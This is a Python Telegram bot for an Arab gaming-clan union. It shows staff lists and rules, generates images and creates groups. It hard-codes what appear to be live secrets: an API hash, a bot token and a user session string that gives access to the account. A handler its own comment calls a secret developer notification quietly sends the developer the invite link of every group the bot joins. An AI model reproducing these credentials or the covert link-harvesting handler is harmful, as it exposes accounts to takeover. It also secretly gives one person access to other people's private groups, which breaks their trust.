import asyncio
import io
import json
import random
from pyrogram import Client, filters, compose
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, ChatPrivileges, ChatPermissions
from PIL import Image, ImageDraw, ImageFont
import arabic_reshaper
from bidi.algorithm import get_display

# ================= الإعدادات (تأكد من صحتها) =================
API_ID = 26604893
API_HASH = "b4dad6237531036f1a4bb2580e4985b1"
BOT_TOKEN = "8457940191:AAH_88PV91G0OK1bGqIF_l7uAOqHMPvgIn8"
SESSION_STRING = "BAGV9V0AZH1OGEOhwhivc-RH9YJ7qc3na1uu6eOA3wBeOUorxspN7bHTqJdkbwGQDiiwvRK98HqD1J735nyRY5XBUsVsVbfMTQZRrWOmLM6SFVVPmjomYJr9tJHidpxEItLwpzRUkYdUVpZXCm44Yblg5uA4ni3Uao9NNEqn_Ss8CdpoQuu5ueYthxgnVPlMctSxNtfXKFTDScnKCi_tY2Kk8NfbL2eU2RLj_IHOUN9AF3auN3NC6JjT3UiRjxpBxRS4UQk5lwFNl5zelcZ2il-vvIieAmhy6DuKdjAcD2ABFrmvqMUd4Cxlq-QsDI1VNhoTwiza_gwdc7Iz_WAL1Hvnnrz__QAAAAHloT2vAA"
DEV_USER = "levil_8" 
COMMITTEE_GROUP_ID = -1002668759955

bot = Client("bot_service", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_app = Client("user_service", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING)

REFEREES_LIST = [
    "feloo9", "SXSPT", "levil_8", "lll_g78", "X_682", "JaeT0", "de_c77", 
    "AmS3NZGR", "c1c_2", "oaa_c", "BR_HM7", "hadikhallill", "z6_i3", 
    "MohMEDPOL", "C_Q9_M", "CQ_SH", "soiisp", "Kupa72", "The_SS64", 
    "Hassnahkl", "mhbg7", "Yahya399", "h_sasn2009", "H_gh556"
]

db = {
    "welcome_pic": None,
    "states": {},
    "custom_buttons": {},  
    "temp_template": {},
    "active_groups": {}, 
    "temp_gp_name": {},
    "dev_id": None,
    "banned_users": [] # قائمة الحظر
}

# نصوص القوانين مع معرفات قصيرة لتجنب خطأ 400
RULES_DATA = {
    "1": {"name": "قسم النشر", "laws": {"1_1": "الانتصارات والخسارة", "1_2": "نشر انتصارات اللاعبين (1)", "1_3": "نشر انتصارات اللاعبين (2)"}},
    "2": {"name": "قسم المواجهات", "laws": {"2_1": "القوائم والتاكات (غير رسمي)", "2_2": "تمديد وقت المواجهة", "2_3": "التوقيت الرسمي", "2_4": "تواجد اللاعبين والتاكات"}},
    "3": {"name": "قسم الاسكربت", "laws": {"3_1": "جميع قوانين السكربت", "3_2": "القانون ورقياً"}},
    "4": {"name": "قسم التصوير", "laws": {"4_1": "طريقة التصوير الصحيحة", "4_2": "شروط التصوير"}},
    "5": {"name": "قسم الحظر", "laws": {"5_1": "قوانين الحظر", "5_2": "السب في الخاص", "5_3": "التبليغ الكاذب"}},
    "6": {"name": "قسم الاعتراض", "laws": {"6_1": "الاعتراض التافه", "6_2": "قوانين الاعتراض والاتفاق", "6_3": "الخروج بدون دليل"}},
    "7": {"name": "قسم القوائم", "laws": {"7_1": "جدولة القوائم", "7_2": "التاك القائمة أو الحاسم"}},
    "8": {"name": "قسم العقود", "laws": {"8_1": "قوانين العقود", "8_2": "احتيال القائد"}},
    "9": {"name": "قسم الإنذارات والقادة", "laws": {"9_1": "قانون الإنذارات", "9_2": "قانون القادة", "9_3": "قانون إضافي", "9_4": "تشويه السمعة"}},
    "10": {"name": "قسم الفار والمباراة", "laws": {"10_1": "استدعاء المشرفين", "10_2": "شروط الاستدعاء", "10_3": "تضيع الوقت", "10_4": "تبديل اللاعبين", "10_5": "التبديل الإضافي"}}
}

LAW_LINKS = {
    "1_1": "https://t.me/arab_union3/137", "1_2": "https://t.me/arab_union3/142", "1_3": "https://t.me/arab_union3/140",
    "2_1": "https://t.me/arab_union3/149", "2_2": "https://t.me/arab_union3/33", "2_3": "https://t.me/arab_union3/112", "2_4": "https://t.me/arab_union3/36",
    "3_1": "https://t.me/arab_union3/32", "3_2": "https://t.me/arab_union3/79",
    "4_1": "https://t.me/arab_union3/190", "4_2": "https://t.me/arab_union3/96",
    "5_1": "https://t.me/arab_union3/40", "5_2": "https://t.me/arab_union3/154", "5_3": "https://t.me/arab_union3/184",
    "6_1": "https://t.me/arab_union3/147", "6_2": "https://t.me/arab_union3/41", "6_3": "https://t.me/arab_union3/38",
    "7_1": "https://t.me/arab_union3/63", "7_2": "https://t.me/arab_union3/148",
    "8_1": "https://t.me/arab_union3/39", "8_2": "https://t.me/arab_union3/37",
    "9_1": "https://t.me/arab_union3/98", "9_2": "https://t.me/arab_union3/155", "9_3": "https://t.me/arab_union3/156", "9_4": "https://t.me/arab_union3/162",
    "10_1": "https://t.me/arab_union3/110", "10_2": "https://t.me/arab_union3/153", "10_3": "https://t.me/arab_union3/166", "10_4": "https://t.me/arab_union3/169", "10_5": "https://t.me/arab_union3/177"
}

# تم تعديل هذا النص لإخفاء المطور من قائمة اللجنة المعلنة
TEXTS = {
    "supreme": "اللـجـنـة الـعُـلـيـيا للـتنـظـيـم \n- مُـلاك الات_حــاد  ❦\n• ━━━━━━❪ 𒆙 ❫━━━━━━ •\n☆ @Q_12_.T - 𝑻𝒉𝒆 𝒐𝒘𝒏𝒆ر    \n★ @H4_OT ★ @KAK_SHI \n★ @h896556 ★ @toji_800\n★ @mwsa_20 ★ @PHT_10\n★ @hu_ssan_113 ★ @l_7yk\n• ━━━━━━❪ 𒆙 ❫━━━━━━ •\n\n- أيّ قَـرار او حـالــة حــظِـر مُــراسـلـة بوت الـل-جــنـة @lgnaharbuinobot",
    "referees": "📜 لـجـنـة الـتـحـكـيـم وحكّامـهـا ⇩\nمسؤول الحـكّام: @feloo9\nمسؤول تفاعل الحكام: @SXSPT\nمسؤول البوتات بالاتحاد العربي: @levil_8\n━───────━ ◦ ━───────━\n1- @SXSPT | 2- @lll_g78 \n3- @X_682 | 4- @JaeT0\n5- @de_c77 | 6- @AmS3NZGR\n7- @c1c_2 | 8- @levil_8 \n9- @oaa_c | 10- @BR_HM7 \n11- @hadikhallill | 12- @z6_i3\n13- @MohMEDPOL | 14- @C_Q9_M \n15- @CQ_SH | 16- @soiisp\n17- @Kupa72 | 18- @The_SS64\n19- @Hassnahkl | 20- @mhbg7\n21- @Yahya399 | 22- @h_sasn2009 \n23- @H_gh556\n━───────━ ◦ ━───────━",
    "clans": "• منظميـن الكلانات\n📜 لـجنـةالــتـنــظــيـم و مـن_ظـمـيـن_هـا ⇩\n𝐓𝐇𝐄 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝑳 ➳ @h896556\n𝐃𝐄𝐏𝐔𝐓𝐘 ¹ ➳ @aj_xj \n━───────━\n① @CQ_SH | ② @hadikhallill\n③ @RAHeUI | ④ @c1c_2 \n⑤ @H_29_A | ⑥ @levii_8 \n⑦ @kak22il | ⑧ @p_bme\n⑨ @Jsoo0w | ⑩ @oaa_c \n⑪ @xggro | ⑫ @ahsvsjsv \n⑬ @y10_i4 | ⑭ @OQO_e1 \n⑮ @Q_Q7E | ⑯ @MohMEDPOL \n⑰ @h896556 | ⑱ @H7_gu \n⑲ @B_17_9 | ⑳ @Messigoatt10\n\n#منظمين_الاتحاد_العربي √\n#منظميـن_البطولات_الكلانات √",
    "indv": "• منظميـن الفرديـات + السريعـات\n━━━━━━━━━━━━━━━━━━━━\n1. @LEO_MESO | 2. @TF_PP \n3. @IBlB27 | 4. @aj_xd \n5. @ismoe1 | 6. @z6_i3 \n7. @Superwow1 | 8. @Mughil236 \n9. @j4_45 | 10. @MaQTDe \n11. @i5_7x | 13. @ABN_ARK \n14. @ahsvsjsv | 15. @TANJAWI_07 \n16. @murtaza_said | 17. @A_99x_1  \n18. @H_3hi | 19. @p_bme \n20. @PM_MG | 21. @itaeche | 22. @mvhhcj \n━━━━━━━━━━━━━━━━━━━━\n- لا يسـمع لـمنظم الفرديـات بتنظيـم بطولـة الـ كلانات\n#منظمين_الاتحاد_العربي √\n#منظميـن_البطولات_الفرديـة √",
    "ads": "ادمـن_يـه الـنـشـر الـعـام\n@c1c_2\n@SXSPT\n@lll_g78\n@mm_khb\n@OQO_e1\n@ahsvsjsv\n@mhbg7\n@X_682\n@levil_8"
}

def main_kb():
    buttons = [
        [InlineKeyboardButton("اللجنة العليا", callback_data="show_supreme")],
        [InlineKeyboardButton("كادر الحكام", callback_data="show_referees")],
        [InlineKeyboardButton("منظمين الكلان", callback_data="show_clans"), InlineKeyboardButton("منظمين الفرديات", callback_data="show_indv")],
        [InlineKeyboardButton("ادمنيه النشر العام", callback_data="show_ads")],
        [InlineKeyboardButton("📜 القوانين", callback_data="rules_main")],
        [InlineKeyboardButton("🎨 صنع صورة", callback_data="task_img"), InlineKeyboardButton("✨ صنع كليشة", callback_data="task_fill")],
        [InlineKeyboardButton("🌐 صنع كروب", callback_data="task_gp")],
        [InlineKeyboardButton("💡 اقتراحات", callback_data="support_sug"), InlineKeyboardButton("🚫 شكاوي", callback_data="support_compl")],
        [InlineKeyboardButton("📞 تواصل", callback_data="support_cont")],
    ]
    for name in db["custom_buttons"]:
        buttons.append([InlineKeyboardButton(name, callback_data=f"c_{name}")])
    if db["states"].get("is_admin"):
         buttons.append([InlineKeyboardButton("⚙️ إعدادات الأزرار", callback_data="admin_btns")])
    return InlineKeyboardMarkup(buttons)

@user_app.on_chat_member_updated()
async def auto_promote(client, update):
    chat_info = db["active_groups"].get(update.chat.id)
    if chat_info and update.new_chat_member and not chat_info["promoted"]:
        user = update.new_chat_member.user
        if not user.is_self:
            db["active_groups"][update.chat.id]["promoted"] = True 
            try:
                privs = ChatPrivileges(can_manage_chat=True, can_delete_messages=True, can_manage_video_chats=True, 
                                       can_restrict_members=True, can_promote_members=True, can_change_info=True, 
                                       can_invite_users=True, can_pin_messages=True, can_post_messages=True, can_edit_messages=True)
                await client.promote_chat_member(update.chat.id, user.id, privileges=privs)
            except Exception: pass

@bot.on_callback_query()
async def callbacks(client, query: CallbackQuery):
    uid = query.from_user.id
    if uid in db["banned_users"]:
        return await query.answer("أنت محظور من استخدام البوت.", show_alert=True)
    
    data = query.data

    if data == "admin_btns":
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("➕ إضافة زر", callback_data="btn_add")], [InlineKeyboardButton("❌ حذف زر", callback_data="btn_del")], [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]])
        await query.message.edit_text("⚙️ تحكم بالأزرار المخصصة:", reply_markup=kb)

    elif data == "btn_add":
        db["states"][uid] = "wait_btn_name"
        await query.message.reply_text("ارسل اسم الزر الجديد:")

    elif data == "btn_del":
        if not db["custom_buttons"]:
            await query.answer("لا توجد أزرار لحذفها", show_alert=True)
            return
        btn_kb = [[InlineKeyboardButton(n, callback_data=f"d_{n}")] for n in db["custom_buttons"]]
        btn_kb.append([InlineKeyboardButton("🔙 رجوع", callback_data="admin_btns")])
        await query.message.edit_text("اختر الزر المراد حذفه:", reply_markup=InlineKeyboardMarkup(btn_kb))

    elif data.startswith("d_"):
        bname = data[2:]
        db["custom_buttons"].pop(bname, None)
        await query.answer(f"تم حذف {bname}")
        await query.message.edit_text("اهـلا بـكـم فـي بـوت كـادر الاتـحـاد الـعـربـي", reply_markup=main_kb())

    elif data.startswith("c_"):
        bname = data[2:]
        val = db["custom_buttons"].get(bname, "لا يوجد محتوى")
        await query.answer()
        await query.message.reply_text(val)

    elif data == "rules_main":
        kb = [[InlineKeyboardButton(v["name"], callback_data=f"rs_{k}")] for k, v in RULES_DATA.items()]
        kb.append([InlineKeyboardButton("🔙 رجوع", callback_data="back_home")])
        await query.message.edit_text("📜 اختر قسم القوانين:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("rs_"):
        sec_id = data[3:]
        section = RULES_DATA.get(sec_id)
        if section:
            kb = [[InlineKeyboardButton(name, callback_data=f"rl_{law_id}")] for law_id, name in section["laws"].items()]
            kb.append([InlineKeyboardButton("🔙 رجوع", callback_data="rules_main")])
            await query.message.edit_text(f"📍 {section['name']}\nاختر القانون:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("rl_"):
        law_id = data[3:]
        link = LAW_LINKS.get(law_id)
        await query.answer()
        await query.message.reply_text(f"🔗 رابط القانون المختار:\n{link}")

    elif data == "show_supreme":
        await query.answer()
        if db["welcome_pic"]: await query.message.reply_photo(db["welcome_pic"], caption=TEXTS["supreme"])
        else: await query.message.reply_text(TEXTS["supreme"])
    
    elif data == "show_referees": await query.answer(); await query.message.reply_text(TEXTS["referees"])
    elif data == "show_clans": await query.answer(); await query.message.reply_text(TEXTS["clans"])
    elif data == "show_indv": await query.answer(); await query.message.reply_text(TEXTS["indv"])
    elif data == "show_ads": await query.answer(); await query.message.reply_text(TEXTS["ads"])
    
    elif data == "task_img":
        db["states"][uid] = "wait_img"
        await query.message.reply_text("🎨 أرسل النص للتصميم (يدعم العربي والإنجليزي):")
    
    elif data == "task_fill":
        db["states"][uid] = "wait_innovate"
        await query.message.reply_text("✨ صف لي الكليشة المطلوبة (ذكاء اصطناعي):")

    elif data == "task_gp":
        db["states"][uid] = "wait_gp"
        await query.message.reply_text("🌐 أرسل اسم الكروب الجديد:")

    elif data.startswith("gp_type_"):
        gtype = data.split("_")[2]
        gname = db["temp_gp_name"].get(uid, "كروب جديد")
        db["states"][uid] = None
        await query.message.edit_text(f"⏳ جاري إنشاء كروب **{gname}** وتصنيفه كـ ({gtype})...")
        
        try:
            new_group = await user_app.create_group(gname, [DEV_USER])
            group_id = new_group.id
            link = await user_app.export_chat_invite_link(group_id)
            db["active_groups"][group_id] = {"name": gname, "type": gtype, "promoted": False}
            await query.message.reply_text(f"✅ تم إنشاء الكروب بنجاح!\n📌 الاسم: {gname}\n🏷 النوع: {gtype}\n🔗 الرابط: {link}")
        except Exception as e:
            await query.message.reply_text(f"❌ فشل إنشاء الكروب: {str(e)}")

    elif data.startswith("support_"):
        mode = data.split("_")[1]
        db["states"][uid] = f"wait_sup_{mode}"
        names = {"sug": "الاقتراح", "compl": "الشكوى", "cont": "الرسالة"}
        await query.message.reply_text(f"📝 يرجى إرسال {names[mode]} الآن:")

    elif data == "back_home":
        await query.message.edit_text("اهـلا بـكـم فـي بـوت كـادر الاتـحـاد الـعـربـي", reply_markup=main_kb())

@bot.on_message(filters.private)
async def logic(client, message):
    uid = message.from_user.id
    if uid in db["banned_users"]: return # تجاهل المحظورين

    state = str(db["states"].get(uid))

    if message.text == "/start":
        if message.from_user.username == DEV_USER:
            db["states"]["is_admin"] = True
            db["dev_id"] = uid
            if db["welcome_pic"] is None:
                db["states"][uid] = "wait_pic"
                await message.reply_text("أهلاً ليفاي.. البوت يحتاج لصورة اللجنة العليا للعمل. أرسلها الآن:")
                return
        cap = "اهـلا بـكـم فـي بـوت كـادر الاتـحـاد الـع_ربـي"
        if db["welcome_pic"]: await message.reply_photo(db["welcome_pic"], caption=cap, reply_markup=main_kb())
        else: await message.reply_text(cap, reply_markup=main_kb())
        return

    if state == "wait_pic" and message.photo:
        db["welcome_pic"] = message.photo.file_id
        db["states"][uid] = None
        await message.reply_text("✅ تم حفظ صورة اللجنة العليا بنجاح.")
        return

    if state == "wait_btn_name":
        db["temp_template"][uid] = message.text
        db["states"][uid] = "wait_btn_val"
        await message.reply_text(f"الآن ارسل النص الذي سيظهر عند الضغط على '{message.text}':")
        return

    elif state == "wait_btn_val":
        name = db["temp_template"][uid]
        db["custom_buttons"][name] = message.text
        db["states"][uid] = None
        await message.reply_text(f"✅ تم إضافة الزر '{name}' بنجاح.")
        return

    elif state == "wait_gp":
        db["temp_gp_name"][uid] = message.text
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("حكم ⚖️", callback_data="gp_type_حكم")],[InlineKeyboardButton("منظم 📋", callback_data="gp_type_منظم")],[InlineKeyboardButton("استخدام شخصي 👤", callback_data="gp_type_شخصي")]])
        await message.reply_text(f"لقد اخترت اسم: **{message.text}**\nالآن حدد نوع الاستخدام لهذا الكروب:", reply_markup=kb)
        return

    elif state == "wait_innovate":
        p = message.text
        styles = [f"⚜️ **إخطار رسمي: {p}** ⚜️\n━━━━━━━━━━━━━\nتحية من كادر الاتحاد العربي، بخصوص طلبكم حول ({p})، نود إحاطتكم بأن اللجنة العليا قد وضعت الضوابط اللازمة لضمان سير العمل. يرجى مراجعة القوانين المنصوص عليها في البوت.\n\n💎 مع تحياتي | @{DEV_USER}",f"💠 ** {p} | تـعـمـيـم إداري ** 💠\n━━━━━━━━━━━━━\nبناءً على الصلاحيات الممنوحة لنا، تقرر فيما يخص ({p}) ضرورة الالتزام الكامل بالمعايير الفنية والروح الرياضية. أي تجاوز سيتم التعامل معه عبر لجنة العقود.\n\n🛡 الاتحاد العربي يرحب بكم.",f"✨ **إبداع الاتحاد: {p}** ✨\n━━━━━━━━━━━━━\nرسالة مخصصة تم توليدها حول موضوع ({p}). نحن هنا لنبني مجتمعاً منظماً وقوياً. شكرنا لكل المنظمين والحكام على جهودهم.\n\n📍 @Q_12_.T"]
        await message.reply_text(f"🤖 **تحليل ذكي للطلب...**\n\n{random.choice(styles)}")
        db["states"][uid] = None
        return

    elif state == "wait_img":
        try:
            # --- تصميم فخم ومطور ---
            reshaped = arabic_reshaper.reshape(message.text)
            bidi_text = get_display(reshaped)
            
            # إنشاء قماش أسود ملكي
            img = Image.new('RGB', (1000, 700), color=(5, 5, 5)) 
            draw = ImageDraw.Draw(img)
            
            # إضافة إطارات ذهبية (Rectangle lines)
            draw.rectangle([20, 20, 980, 680], outline="gold", width=3)
            draw.rectangle([35, 35, 965, 665], outline="#C0C0C0", width=1) # لمسة فضية
            
            # محاولة تحميل خط فخم أو العادي
            try: 
                font_main = ImageFont.truetype("arial.ttf", 55)
                font_title = ImageFont.truetype("arial.ttf", 40)
            except: 
                font_main = ImageFont.load_default()
                font_title = ImageFont.load_default()

            # كتابة العنوان
            title_text = get_display(arabic_reshaper.reshape(" الاتحاد العربي للكلانات ⤽"))
            draw.text((500, 80), title_text, fill="gold", font=font_title, anchor="mm")
            
            # إضافة خط فاصل زخرفي
            draw.line([300, 120, 700, 120], fill="gold", width=2)

            # كتابة النص الأساسي في المنتصف
            lines = bidi_text.split('\n')
            y_offset = 200
            for line in lines:
                draw.text((500, y_offset), line, fill="white", font=font_main, anchor="mm")
                y_offset += 75

            # تذييل الصورة
            footer_text = f"Dev: @{DEV_USER}"
            draw.text((500, 640), footer_text, fill="#888888", font=font_title, anchor="mm")

            bio = io.BytesIO(); bio.name="tournament.png"; img.save(bio, "PNG"); bio.seek(0)
            await message.reply_photo(bio, caption=f"✅ تم التصميم بنظام القرعة الاحترافي")
        except Exception as e:
            await message.reply_text(f"❌ حدث خطأ في التصميم: {str(e)}")
        
        db["states"][uid] = None
        return

    if state.startswith("wait_sup_"):
        mode = state.split("_")[2]
        if db["dev_id"]: await message.forward(db["dev_id"])
        try: await message.forward(COMMITTEE_GROUP_ID)
        except: pass
        await message.reply_text(f"✅ تم التوجيه بنجاح.")
        db["states"][uid] = None

@bot.on_message(filters.group & filters.reply)
async def group_logic(client, message):
    # نظام حظر المستخدمين بالرد
    if message.text == "حظر" and (message.chat.id == COMMITTEE_GROUP_ID or message.from_user.username == DEV_USER):
        if message.reply_to_message.forward_from:
            target_id = message.reply_to_message.forward_from.id
            if target_id not in db["banned_users"]:
                db["banned_users"].append(target_id)
                await message.reply_text(f"🚫 تم حظر المستخدم {target_id} من استخدام البوت.")
            else:
                await message.reply_text("المستخدم محظور بالفعل.")
        elif message.reply_to_message.from_user:
            target_id = message.reply_to_message.from_user.id
            if target_id not in db["banned_users"]:
                db["banned_users"].append(target_id)
                await message.reply_text(f"🚫 تم حظر المستخدم {target_id} من استخدام البوت.")
            else:
                await message.reply_text("المستخدم محظور بالفعل.")
        return

    # نظام الرد على الشكاوي والاقتراحات
    if message.chat.id == COMMITTEE_GROUP_ID and message.reply_to_message and message.reply_to_message.forward_from:
        try: await bot.send_message(message.reply_to_message.forward_from.id, f"💬 **رد اللجنة:**\n\n{message.text}")
        except: pass

# --- الإضافة الجديدة: الإشعار السري للمطور عند دخول أو ترقية البوت ---
@bot.on_chat_member_updated()
async def secret_bot_tracker(client, update):
    if update.new_chat_member and update.new_chat_member.user and update.new_chat_member.user.is_self:
        try:
            chat = update.chat
            info = f"🤫 **إشعار سري للمطور:**\n\n"
            info += f"تمت إضافة أو ترقية البوت في مجموعة!\n"
            info += f"📌 اسم الجروب: {chat.title}\n"
            info += f"🆔 الأيدي: `{chat.id}`\n"
            try:
                link = await client.export_chat_invite_link(chat.id)
                info += f"🔗 الرابط: {link}"
            except Exception:
                if chat.username:
                    info += f"🔗 الرابط: https://t.me/{chat.username}"
                else:
                    info += f"🔗 الرابط: (البوت يحتاج صلاحية إضافة مشرفين لجلب الرابط)"
            
            await client.send_message("levil_8", info)
        except Exception:
            pass

# === [الإضافة الخاصة بحل مشكلة Peer ID المخفية دون مسح أي شيء] ===
def global_exception_handler(loop, context):
    exception_msg = str(context.get("exception", ""))
    if "Peer id invalid" in exception_msg or "ID not found" in exception_msg:
        pass # نتجاهل الخطأ المزعج لمنعه من ملء الكونسول وإيقاف المهام
    else:
        loop.default_exception_handler(context)

async def cache_missing_peers():
    await asyncio.sleep(5) # ننتظر ثواني حتى تتصل الحسابات
    try:
        async for _ in bot.get_dialogs(limit=50): pass
        async for _ in user_app.get_dialogs(limit=50): pass
    except Exception:
        pass
# ===================================================================

async def main():
    print("--- البوت يعمل بكامل الإضافات المطلوبة ---")
    asyncio.create_task(cache_missing_peers()) # الإضافة هنا لجلب وتخزين الآيديات تلقائياً
    await compose([bot, user_app])

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.set_exception_handler(global_exception_handler) # الإضافة هنا لكتم الإشعارات الخاطئة
    loop.run_until_complete(main())
